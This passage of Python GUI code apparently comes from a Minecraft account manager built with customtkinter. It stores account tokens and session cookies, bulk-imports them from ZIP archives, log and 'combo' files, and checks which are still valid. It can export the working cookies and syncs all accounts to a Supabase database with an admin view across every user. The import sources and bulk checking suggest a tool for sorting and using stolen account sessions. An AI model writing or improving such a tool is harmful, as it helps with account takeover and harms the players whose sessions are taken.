        _lbl(nw, "Minecraft Name")
        nr = ctk.CTkFrame(nw, fg_color="transparent")
        nr.pack(fill="x", pady=(4, 0))
        self.avatar_label = ctk.CTkLabel(nr, text="?", width=32, height=32,
                                         fg_color="#374151", corner_radius=6, font=ctk.CTkFont(size=14))
        self.avatar_label.pack(side="left", padx=(0, 8))
        ctk.CTkEntry(nr, textvariable=self.name_var).pack(side="left", fill="x", expand=True)
        if acc.get("name"):
            self._request_skin(acc["name"], self.avatar_label, size=32)

        # Email
        ew = ctk.CTkFrame(sf, fg_color="transparent")
        ew.pack(fill="x", pady=(0, 10))
        _lbl(ew, "Email")
        ctk.CTkEntry(ew, textvariable=self.email_var).pack(fill="x", pady=(4, 0))

        # Status
        sw = ctk.CTkFrame(sf, fg_color="transparent")
        sw.pack(fill="x", pady=(0, 10))
        _lbl(sw, "Status")
        ctk.CTkOptionMenu(sw, variable=self.status_var, values=STATUS_OPTIONS).pack(fill="x", pady=(4, 0))

        # Token
        tw = ctk.CTkFrame(sf, fg_color="transparent")
        tw.pack(fill="x", pady=(0, 10))
        _lbl(tw, "Access Token")
        tr = ctk.CTkFrame(tw, fg_color="transparent")
        tr.pack(fill="x", pady=(4, 0))
        self.token_entry = ctk.CTkEntry(tr, textvariable=self.token_var, show="\u2022")
        self.token_entry.pack(side="left", fill="x", expand=True)
        ctk.CTkButton(tr, text="👁", width=30, fg_color="#374151", hover_color="#4b5563",
                      command=self._toggle_token_visibility).pack(side="left", padx=(4, 0))
        ctk.CTkButton(tr, text="⧉", width=30, fg_color="#374151", hover_color="#4b5563",
                      command=self._copy_form_token).pack(side="left", padx=(4, 0))
        self.token_status_label = ctk.CTkLabel(tw, text="", font=ctk.CTkFont(size=11), anchor="w", height=16)
        self.token_status_label.pack(fill="x", pady=(3, 0))

        # Cookie
        cw = ctk.CTkFrame(sf, fg_color="transparent")
        cw.pack(fill="x", pady=(0, 10))
        clr = ctk.CTkFrame(cw, fg_color="transparent")
        clr.pack(fill="x")
        ctk.CTkLabel(clr, text="🍪 Cookie", font=ctk.CTkFont(size=11), text_color="#f59e0b", anchor="w").pack(side="left")
        ctk.CTkLabel(clr, text=" (optional)", font=ctk.CTkFont(size=10), text_color="#6b7280").pack(side="left")
        cr = ctk.CTkFrame(cw, fg_color="transparent")
        cr.pack(fill="x", pady=(4, 0))
        self._cookie_visible = False
        self.cookie_entry = ctk.CTkEntry(cr, textvariable=self.cookie_var, show="•",
                                         placeholder_text="Paste cookie string...")
        self.cookie_entry.pack(side="left", fill="x", expand=True)
        self.cookie_eye_btn = ctk.CTkButton(cr, text="👁", width=30, fg_color="#374151", hover_color="#4b5563",
                                             command=self._toggle_cookie_visibility)
        self.cookie_eye_btn.pack(side="left", padx=(4, 0))
        ctk.CTkButton(cr, text="⧉", width=30, fg_color="#374151", hover_color="#4b5563",
                      command=lambda: (self.clipboard_clear(), self.clipboard_append(self.cookie_var.get()))
                      ).pack(side="left", padx=(4, 0))
        self.cookie_status_label = ctk.CTkLabel(cw, text="", font=ctk.CTkFont(size=11), anchor="w", height=16)
        self.cookie_status_label.pack(fill="x", pady=(3, 0))

        # Notes
        notew = ctk.CTkFrame(sf, fg_color="transparent")
        notew.pack(fill="x", pady=(0, 10))
        _lbl(notew, "Notes")
        ctk.CTkEntry(notew, textvariable=self.note_var).pack(fill="x", pady=(4, 0))

        # Last checked
        lcw = ctk.CTkFrame(sf, fg_color="transparent")
        lcw.pack(fill="x", pady=(0, 10))
        _lbl(lcw, "Last Checked")
        lcr = ctk.CTkFrame(lcw, fg_color="transparent")
        lcr.pack(fill="x", pady=(4, 0))
        ctk.CTkEntry(lcr, textvariable=self.last_checked_var, placeholder_text="YYYY-MM-DD").pack(side="left", fill="x", expand=True)
        ctk.CTkButton(lcr, text="Today", width=54, fg_color="#374151", hover_color="#4b5563",
                      command=lambda: self.last_checked_var.set(date.today().isoformat())).pack(side="left", padx=(4, 0))

        # Cleanup when dialog closes
        def _on_destroy(*_):
            self.token_status_label = None
            self.cookie_status_label = None
            self.avatar_label = None
        dlg.bind("<Destroy>", _on_destroy)

        # Bottom bar
        bb = ctk.CTkFrame(dlg, fg_color="#111827", corner_radius=0, height=60)
        bb.pack(fill="x", side="bottom")
        bb.pack_propagate(False)

        def _save():
            d = self._read_form()
            if d is None:
                return
            if index is None:
                if not self._confirm_if_duplicate(d):
                    return
                self.accounts.append(d)
            else:
                if not self._confirm_if_duplicate(d, exclude_index=index):
                    return
                self.accounts[index] = d
            self.sort_accounts(self.sort_by_var.get())
            self.save_accounts()
            self._refresh_list()
            dlg.destroy()

        ctk.CTkButton(bb, text="Save" if index is not None else "Add Account",
                      height=38, fg_color="#3b82f6", hover_color="#2563eb",
                      font=ctk.CTkFont(size=13, weight="bold"), corner_radius=8,
                      command=_save,
                      ).pack(side="left", expand=True, fill="x", padx=(16, 4), pady=11)
        ctk.CTkButton(bb, text="Cancel",
                      height=38, fg_color="#374151", hover_color="#4b5563",
                      font=ctk.CTkFont(size=13), corner_radius=8,
                      command=dlg.destroy,
                      ).pack(side="left", expand=True, fill="x", padx=(4, 16), pady=11)

    # ─────────────────── SKIN / AVATAR ───────────────────────────────────

    def _request_skin(self, name, label, size):
        if not name:
            return
        key = name.lower()
        if key in self.skin_cache:
            self._apply_avatar(label, self.skin_cache[key], size=size)
            return
        def worker():
            img = fetch_skin_head(name, size=max(size, 64))
            self.skin_cache[key] = img
            self.after(0, lambda: self._apply_avatar(label, img, size=size))
        threading.Thread(target=worker, daemon=True).start()

    def _apply_avatar(self, label, pil_img, size):
        try:
            if not label.winfo_exists():
                return
        except Exception:
            return
        if pil_img is None:
            label.configure(image=None, text="?")
            return
        ctk_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=(size, size))
        label.configure(image=ctk_img, text="")
        label.image = ctk_img

    # ─────────────────── AUTO-VALIDATION ─────────────────────────────────

    def _safe_label(self, label, **kwargs):
        if label is None:
            return
        try:
            if label.winfo_exists():
                label.configure(**kwargs)
        except Exception:
            pass

    def _on_name_changed(self, *_):
        if self._skin_after_id:
            try:
                self.after_cancel(self._skin_after_id)
            except Exception:
                pass
        name = self.name_var.get().strip()
        if not name or self.avatar_label is None:
            return
        self._skin_after_id = self.after(500, lambda: self._request_skin(name, self.avatar_label, size=32))

    def _on_token_changed(self, *_):
        # Guard: if no dialog is open, token_status_label is None — skip silently
        if self.token_status_label is None:
            return
        if self._token_check_after_id:
            try:
                self.after_cancel(self._token_check_after_id)
            except Exception:
                pass
            self._token_check_after_id = None
        token = self.token_var.get().strip()
        if not token:
            self._safe_label(self.token_status_label, text="", text_color="#9ca3af")
            return
        self._safe_label(self.token_status_label, text="⏳ Validating token...", text_color="#9ca3af")
        self._token_check_after_id = self.after(200, lambda: self._check_token_async(token))

    def _check_token_async(self, token):
        def worker():
            try:
                ok, pname, uuid, _capes = check_token_profile(token)
                self.after(0, lambda: self._apply_token_status(token, ok, pname, uuid))
            except Exception:
                self.after(0, lambda: self._apply_token_status(token, False, "", ""))
        threading.Thread(target=worker, daemon=True).start()

    def _apply_token_status(self, token, is_valid, player_name, uuid):
        if self.token_var.get().strip() != token:
            return
        if is_valid:
            self.status_var.set("Active")
            self._safe_label(self.token_status_label,
                             text=f"✅ Active ({player_name})" if player_name else "✅ Active",
                             text_color="#22c55e")
            if not self.name_var.get().strip() and player_name:
                self.name_var.set(player_name)
            if not self.last_checked_var.get().strip():
                self.last_checked_var.set(date.today().isoformat())
        else:
            self.status_var.set("Invalid")
            self._safe_label(self.token_status_label, text="❌ Invalid / Expired token", text_color="#f97316")
            if not self.last_checked_var.get().strip():
                self.last_checked_var.set(date.today().isoformat())

    def _on_cookie_changed(self, *_):
        if self._cookie_check_after_id:
            try:
                self.after_cancel(self._cookie_check_after_id)
            except Exception:
                pass
            self._cookie_check_after_id = None
        cookie = self.cookie_var.get().strip()
        if not cookie:
            self._safe_label(self.cookie_status_label, text="", text_color="#9ca3af")
            return
        self._safe_label(self.cookie_status_label, text="⏳ Validating cookie...", text_color="#9ca3af")
        self._cookie_check_after_id = self.after(200, lambda: self._check_cookie_async(cookie))

    def _check_cookie_async(self, cookie):
        def worker():
            try:
                ok, pname, uuid, etok, _capes = check_cookie_profile(cookie)
                self.after(0, lambda: self._apply_cookie_status(cookie, ok, pname, uuid, etok))
            except Exception:
                self.after(0, lambda: self._apply_cookie_status(cookie, False, "", "", ""))
        threading.Thread(target=worker, daemon=True).start()

    def _apply_cookie_status(self, cookie, is_valid, player_name, uuid, extracted_tok):
        if self.cookie_var.get().strip() != cookie:
            return
        if is_valid:
            self.status_var.set("Active")
            self._safe_label(self.cookie_status_label,
                             text=f"✅ Active ({player_name})" if player_name else "✅ Cookie active",
                             text_color="#22c55e")
            if not self.name_var.get().strip() and player_name:
                self.name_var.set(player_name)
            if extracted_tok and not self.token_var.get().strip():
                self.token_var.set(extracted_tok)
            if not self.last_checked_var.get().strip():
                self.last_checked_var.set(date.today().isoformat())
        else:
            if not self.token_var.get().strip():
                self.status_var.set("Invalid")
            self._safe_label(self.cookie_status_label, text="❌ Invalid / Expired cookie", text_color="#f97316")
            if not self.last_checked_var.get().strip():
                self.last_checked_var.set(date.today().isoformat())

    def _toggle_token_visibility(self):
        self.token_form_visible = not self.token_form_visible
        try:
            self.token_entry.configure(show="" if self.token_form_visible else "•")
        except Exception:
            pass

    def _toggle_cookie_visibility(self):
        self._cookie_visible = not self._cookie_visible
        try:
            self.cookie_entry.configure(show="" if self._cookie_visible else "•")
            self.cookie_eye_btn.configure(text="🙈" if self._cookie_visible else "👁")
        except Exception:
            pass

    def _copy_form_token(self):
        t = self.token_var.get()
        if t:
            self.clipboard_clear()
            self.clipboard_append(t)

    def _copy_token(self, token):
        self.clipboard_clear()
        self.clipboard_append(token)

    def _toggle_row_token(self, index):
        self.token_visible_rows[index] = not self.token_visible_rows.get(index, False)
        self._refresh_list()

    def _toggle_row_cookie(self, index):
        key = f"cookie_{index}"
        self.token_visible_rows[key] = not self.token_visible_rows.get(key, False)
        self._refresh_list()

    def _mark_checked_today(self, index):
        self.accounts[index]["last_checked"] = date.today().isoformat()
        self.save_accounts()
        self._refresh_list()

    # ─────────────────── DATABASE ─────────────────────────────────────────

    def _switch_database(self, target_user):
        if not self.is_admin:
            return
        if self.active_db_user != "👑 ALL USERS":
            self.save_accounts(push_cloud=False)
        self.active_db_user = target_user
        if target_user == "👑 ALL USERS":
            self.accounts = []
            self.selected_index = None
            me = self.current_user
            self.sub_user_label.configure(text=f"  •  {me} (👑 MASTER DB: ALL USERS)")
            self._async_pull_supabase(silent=True)
        else:
            safe = "".join(c for c in target_user.lower() if c.isalnum() or c in "_-") or "default"
            self.data_file = APP_DIR / f"accounts_{safe}.json"
            self.accounts = self.load_accounts()
            self.selected_index = None
            self.sort_accounts(self.sort_by_var.get())
            me = self.current_user
            self.sub_user_label.configure(
                text=f"  •  {me}" if target_user.lower() == me.lower() else f"  •  {me} (DB: {target_user})"
            )
            self._refresh_list()
            if getattr(self, "supabase_enabled", True) and getattr(self, "supabase_url", None) and getattr(self, "supabase_key", None):
                self._async_pull_supabase(silent=True)

    def _switch_user(self):
        self.save_accounts()
        self.destroy()
        LoginWindow(on_success=lambda u: AccountManager(current_user=u).mainloop()).mainloop()

    def load_accounts(self):
        if not self.data_file.exists():
            return []
        try:
            with self.data_file.open("r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []

    def _load_from_path(self, path):
        if not path.exists():
            return []
        try:
            with path.open("r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []

    def save_accounts(self, push_cloud=True):
        with self.data_file.open("w", encoding="utf-8") as f:
            json.dump(self.accounts, f, indent=2, ensure_ascii=False)
        if push_cloud and getattr(self, "supabase_enabled", True):
            url = getattr(self, "supabase_url", DEFAULT_SUPABASE_URL)
            key = getattr(self, "supabase_key", DEFAULT_SUPABASE_KEY)
            owner = getattr(self, "active_db_user", "admin")
            if url and key and self.accounts:
                accs_copy = [dict(a) for a in self.accounts]
                threading.Thread(target=lambda: supabase_upsert_accounts(url, key, owner, accs_copy), daemon=True).start()

    # ─────────────────── IMPORT / EXPORT ─────────────────────────────────

    def download_active_cookies(self):
        active = [a for a in self.accounts if a.get("cookie") and a.get("status") == "Active"]
        if not active:
            messagebox.showinfo("No Data", "No active cookie accounts found.")
            return
        path = filedialog.asksaveasfilename(
            title="Save Active Cookie Accounts", defaultextension=".txt",
            filetypes=[("Text File", "*.txt"), ("JSON File", "*.json"), ("All Files", "*.*")],
            initialfile=f"active_cookies_{date.today().isoformat()}.txt",
        )
        if not path:
            return
        try:
            if path.endswith(".json"):
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(active, f, indent=2, ensure_ascii=False)
            else:
                lines = []
                for acc in active:
                    lines.append(f"# {acc.get('name','Unknown')} | {acc.get('status','')} | {acc.get('last_checked','')}")
                    if acc.get("token"):
                        lines.append(f"Token: {acc['token']}")
                    if acc.get("cookie"):
                        lines.append(f"Cookie: {acc['cookie']}")
                    if acc.get("email"):
                        lines.append(f"Email: {acc['email']}")
                    lines.append("")
                with open(path, "w", encoding="utf-8") as f:
                    f.write("\n".join(lines))
            messagebox.showinfo("Exported", f"✅ {len(active)} account(s) exported to:\n{path}")
        except Exception as e:
            messagebox.showerror("Export Error", str(e))

    def import_files(self):
        file_paths = filedialog.askopenfilenames(
            title="Select ZIP / Token / Cookie Files",
            filetypes=[
                ("All Supported", "*.zip;*.txt;*.json;*.log;*.cookie;*.cookies"),
                ("ZIP Archives", "*.zip"),
                ("Token / Combo Files", "*.txt;*.log"),
                ("Cookie Files", "*.json;*.cookie;*.cookies"),
                ("All Files", "*.*"),
            ]
        )
        if not file_paths:
            return
        extracted = []
        for fp in file_paths:
            p = Path(fp)
            if p.suffix.lower() == ".zip":
                extracted.extend(extract_tokens_from_zip(str(p)))
            else:
                try:
                    with p.open("r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    label = f"File: {p.name}"
                    cookie_items = extract_cookies_from_text(content)
                    for item in cookie_items:
                        item["note"] = f"{item['note']} | {label}"
                        extracted.append(item)
                    if not cookie_items:
                        token_items = extract_tokens_from_text(content)
                        for item in token_items:
                            item["note"] = label
                            extracted.append(item)
                except Exception as e:
                    print("Error reading file:", e)
        if not extracted:
            messagebox.showinfo("Nothing Found", "No valid tokens or cookies found.")
            return
        BulkImportDialog(self, extracted, self._on_bulk_import_done)

    def open_paste_dialog(self):
        dialog = ctk.CTkToplevel(self)
        dialog.title("Paste Tokens or Cookies")
        dialog.geometry("540x380")
        dialog.resizable(False, False)
        dialog.grab_set()
        ctk.CTkLabel(dialog, text="Paste raw tokens or cookie data below:",
                     font=ctk.CTkFont(size=12, weight="bold")).pack(anchor="w", padx=20, pady=(16, 6))
        ta = ctk.CTkTextbox(dialog, height=220, font=ctk.CTkFont(family="Consolas", size=12))
        ta.pack(fill="both", expand=True, padx=20, pady=(0, 14))

        def proceed():
            content = ta.get("1.0", "end").strip()
            if not content:
                dialog.destroy()
                return
            items = extract_cookies_from_text(content)
            for it in items:
                it["note"] = "Pasted Cookie"
            if not items:
                items = extract_tokens_from_text(content)
                for it in items:
                    it["note"] = "Pasted Token"
            dialog.destroy()
            if not items:
                messagebox.showinfo("Nothing Found", "No valid tokens or cookies could be recognized.")
                return
            BulkImportDialog(self, items, self._on_bulk_import_done)

        br = ctk.CTkFrame(dialog, fg_color="transparent")
        br.pack(fill="x", padx=20, pady=(0, 16))
        ctk.CTkButton(br, text="Import & Check", fg_color="#3b82f6", hover_color="#2563eb",
                      font=ctk.CTkFont(weight="bold"), command=proceed).pack(side="right", padx=(6, 0))
        ctk.CTkButton(br, text="Cancel", fg_color="#374151", command=dialog.destroy).pack(side="right")

    def _on_bulk_import_done(self, new_accounts):
        if not new_accounts:
            return
        def _key(acc):
            return acc.get("token", "") or acc.get("cookie", "")[:40]
        existing_map = {_key(acc): idx for idx, acc in enumerate(self.accounts) if _key(acc)}
        added = updated = 0
        for na in new_accounts:
            k = _key(na)
            if k and k in existing_map:
                idx = existing_map[k]
                self.accounts[idx]["status"] = na["status"]
                self.accounts[idx]["last_checked"] = na["last_checked"]
                if na.get("cookie"):
                    self.accounts[idx]["cookie"] = na["cookie"]
                if na.get("name") and not self.accounts[idx].get("name"):
                    self.accounts[idx]["name"] = na["name"]
                updated += 1
            else:
                self.accounts.append(na)
                if k:
                    existing_map[k] = len(self.accounts) - 1
                added += 1
        self.sort_accounts(self.sort_by_var.get())
        self.save_accounts()
        self._refresh_list()
        messagebox.showinfo("Import Finished",
                            f"✅ Processed {len(new_accounts)} accounts!\n\n"
                            f"• Added: {added}\n• Updated: {updated}\n• Total: {len(self.accounts)}")

    def check_all_accounts(self):
        if not self.accounts:
            messagebox.showinfo("No Accounts", "No accounts to check.")
            return
        BulkImportDialog(self, self.accounts, self._on_recheck_all_done)

    def _on_recheck_all_done(self, updated_accounts):
        self.accounts = updated_accounts
        self.sort_accounts(self.sort_by_var.get())
        self.save_accounts()
        self._refresh_list()
        messagebox.showinfo("Check Complete", "All accounts have been re-validated!")

    # ─────────────────── CRUD ─────────────────────────────────────────────

    def select_account(self, index):
        self._open_edit_dialog(index)

    def _read_form(self):
        name = self.name_var.get().strip()
        token = self.token_var.get().strip()
        cookie = self.cookie_var.get().strip()
        status = self.status_var.get()
        if status == "Unknown" and (token or cookie):
            if token:
                try:
                    ok, pname, _, _capes = check_token_profile(token)
                    status = "Active" if ok else "Invalid"
                    if not name and pname:
                        name = pname
                except Exception:
                    pass
            elif cookie:
                try:
                    ok, pname, _, etok, _capes = check_cookie_profile(cookie)
                    status = "Active" if ok else "Invalid"
                    if not name and pname:
                        name = pname
                    if etok and not token:
                        token = etok
                except Exception:
                    pass
        if not name:
            if token:
                name = f"MC-{token[:6]}"
            elif cookie:
                name = f"Cookie-{cookie[:6]}"
            else:
                messagebox.showwarning("Missing Input", "Please enter a Minecraft name.")
                return None
        return {
            "name": name,
            "email": self.email_var.get().strip(),
            "status": status,
            "token": token,
            "cookie": cookie,
            "note": self.note_var.get().strip(),
            "last_checked": self.last_checked_var.get().strip() or date.today().isoformat(),
        }

    def _find_duplicate(self, name, token, exclude_index=None):
        nl = name.lower()
        for i, acc in enumerate(self.accounts):
            if i == exclude_index:
                continue
            if acc["name"].lower() == nl:
                return i, "Minecraft Name"
            if token and acc.get("token") == token:
                return i, "Token"
        return None, None

    def _confirm_if_duplicate(self, acc, exclude_index=None):
        di, dk = self._find_duplicate(acc["name"], acc["token"], exclude_index)
        if di is None:
            return True
        return messagebox.askyesno("Already exists",
                                   f"{dk} already exists (\"{self.accounts[di]['name']}\"). Save anyway?")

    def add_account(self):
        acc = self._read_form()
        if acc is None:
            return
        if not self._confirm_if_duplicate(acc):
            return
        self.accounts.append(acc)
        self.sort_accounts(self.sort_by_var.get())
        self.save_accounts()
        self._refresh_list()

    def update_account(self):
        if self.selected_index is None:
            return
        acc = self._read_form()
        if acc is None:
            return
        if not self._confirm_if_duplicate(acc, exclude_index=self.selected_index):
            return
        self.accounts[self.selected_index] = acc
        self.sort_accounts(self.sort_by_var.get())
        self.save_accounts()
        self._refresh_list()

    def delete_account(self, index=None):
        index = self.selected_index if index is None else index
        if index is None:
            return
        name = self.accounts[index].get("name", "this account")
        if not messagebox.askyesno("Delete", f"Delete \"{name}\"?"):
            return
        del self.accounts[index]
        self.save_accounts(push_cloud=False)
        self._refresh_list()
        if getattr(self, "supabase_enabled", True):
            url = getattr(self, "supabase_url", DEFAULT_SUPABASE_URL)
            key = getattr(self, "supabase_key", DEFAULT_SUPABASE_KEY)
            owner = getattr(self, "active_db_user", "admin")
            if url and key:
                threading.Thread(target=lambda: supabase_delete_account(url, key, owner, name), daemon=True).start()

    def clear_form(self):
        self.name_var.set("")
        self.email_var.set("")
        self.status_var.set(STATUS_OPTIONS[0])
        self.token_var.set("")
        self.cookie_var.set("")
        self.note_var.set("")
        self.last_checked_var.set("")
        self.selected_index = None





if __name__ == "__main__":
    def _start_app(user="admin"):
        AccountManager(current_user=user).mainloop()

    LoginWindow(on_success=_start_app).mainloop()
